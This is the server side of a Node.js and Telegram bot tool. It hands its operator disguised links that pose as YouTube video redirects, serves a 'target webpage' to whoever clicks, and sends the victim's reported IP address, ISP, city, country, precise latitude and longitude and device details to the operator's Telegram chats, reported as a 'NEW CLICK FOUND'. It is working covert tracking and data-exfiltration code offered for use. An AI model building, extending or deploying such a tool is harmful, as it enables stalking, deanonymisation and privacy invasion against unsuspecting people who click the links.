//imports
const express = require("express");
const http = require("http");
const path = require("path");
const bodyParser = require("body-parser");
const TelegramBot = require("node-telegram-bot-api");
const crypto = require('crypto');
require("dotenv").config();

//hash password
function hashPassword(data) {
    return crypto.createHash('sha256').update(data).digest('hex');
}

function matchHashPassword(password, value) {
    const hashedInput = hashPassword(password);
    return hashedInput === value;
}


//get values from env
const TOKEN = process.env.TOKEN; //Telegram Bot Token
const URL = process.env.URL;// the website hosted URL
const PASSWORD = process.env.PASSWORD; //password (hashed) use : hashedPassword(value) to generate hash
const PORT = process.env.PORT; //port number for running server

//initializations
const app = express(); //initialize express
const server = http.createServer(app); //initialize app
const bot = new TelegramBot(TOKEN,{polling:true}); //initialize telegram bot


//middlewares
app.use(express.static(path.join(__dirname,"static"))); //adding static folders
app.use(express.json()); //adding json 
app.use(bodyParser.urlencoded({ extended: true })); //adding url body

//store all telegram controllers
const controllers = {};

//for authorized users only
function manageAuthenticatedUsers(msg,bot){
    const chatId = msg.chat.id;
    const message = msg.text;
    const splittedMessage = message.split(" ");
    if( splittedMessage[0] === "url"){
        if(splittedMessage.length>=2){
            bot.sendMessage(chatId,`*The URL is :* _${URL}/run?youtube=${splittedMessage[1]}_\n *(Will Redirect to Youtube Video With ID ${splittedMessage[1]})*`,{parse_mode: 'Markdown'});
        }
        else{
            bot.sendMessage(chatId,`*The URL is :* _${URL}_\n *(Will Redirect to Default Youtube Video)*`,{parse_mode: 'Markdown'});
        }
        
    }
    else if(splittedMessage[0] === "help"){
        const helpMessage = `
        *HELP*\n----------\n
        -*url* : _Create a URL which Redirects to default video ID_
        -*url [Video ID]* : _Create a URL which Redirects to given ID_
        -*ping* : _Check Authentication_
        -*help* : _Shows this message_
        
        `;

        bot.sendMessage(chatId,helpMessage,{parse_mode: 'Markdown'});

    }
    else if(splittedMessage[0] == "ping"){
        bot.sendMessage(chatId,"*YOU ARE AUTHENTICATED !!!*",{parse_mode: 'Markdown'});
    }
    
}

//for Un-authorized users only
function manageUnAuthenticatedUsers(msg,bot){
    const message = msg.text;
    const chatID = msg.chat.id;
    const messageID = msg.message_id;
    const CorrectPassword = matchHashPassword(message,PASSWORD); //returns true or false
    if(CorrectPassword){
        controllers[chatID] = {};
        bot.deleteMessage(chatID, messageID)
        bot.sendMessage(chatID, '🥳 *Congratulations!  You are Logged In*',{parse_mode: 'Markdown'});
    }
}

//manage Telegram BOT
bot.on("message",(msg)=>{
    const chatID = msg.chat.id;
    //check authentication
    if(controllers[chatID]){manageAuthenticatedUsers(msg,bot);}
    else{manageUnAuthenticatedUsers(msg,bot);}
})

//target webpage
app.get("*",(req,res)=>{
    res.sendFile(path.join(__dirname,"static","client.html"));
})


//response from target webpage
app.post('/info',(req,res)=>{
    const data = req.body;
    const finalData = `
    *NEW CLICK FOUND*
    -------------------------\n\n
    *OS* : _${data.os}_
    *VERSION* : _${data.osVersion}_
    *COLOR-SCHEME* : _${data.colorScheme}_
    *URL* : _${data.url}_
    *BATTERY-LEVEL* : _${data.batteryLevel}_
    *BATTERY-STATUS* : _${data.batteryStatus}_
    *TIME-TO-DISCHARGE* : _${data.timeToDischarge}_
    *IPV4 ADDRESS* : _${data.ipv4}_
    *ISP* : _${data.isp}_
    *CITY/STATE* : _${data.city}_
    *COUNTRY* : _${data.country}_
    *SCREEN-SIZE* : _${data.screenSize}_
    *PAGES-BACK* : _${data.pagesBack}_
    *TIMEZONE* : _${data.timeZone}_
    *Number-OF-PROCESSORS* : _${data.logicalProcessors}_
    *IS-MOBILE* : _${data.isMobile}_
    *LOCATION-ACCURACY* : _${data.locationAccuracy}_
    *LATTITUDE* : _${data.lattitude}_
    *LONGITUDE* : _${data.longitude}_
    `;

    res.json({success:true}); //send success message to webpage
    
    //send data to all authenticated Telegram Controllers
    Object.keys(controllers).forEach(function(chatId){
        //send text data
        bot.sendMessage(chatId, finalData, {parse_mode: 'Markdown'}).then((sentMessage) => {
            const sentMessageId = sentMessage.message_id; // Get the message_id instead of chat.id
          
            if (data.lattitude != undefined && data.longitude != undefined) {
                //send location data (mentioning the text data)
              bot.sendLocation(chatId, data.lattitude, data.longitude, {
                reply_to_message_id: sentMessageId // Use message_id here
              });
            }
          }).catch((error) => {
            console.error('Error:', error);
          });
    })
})

//run server
server.listen(PORT,()=>{console.log(`Started Server on PORT : ${PORT}`)});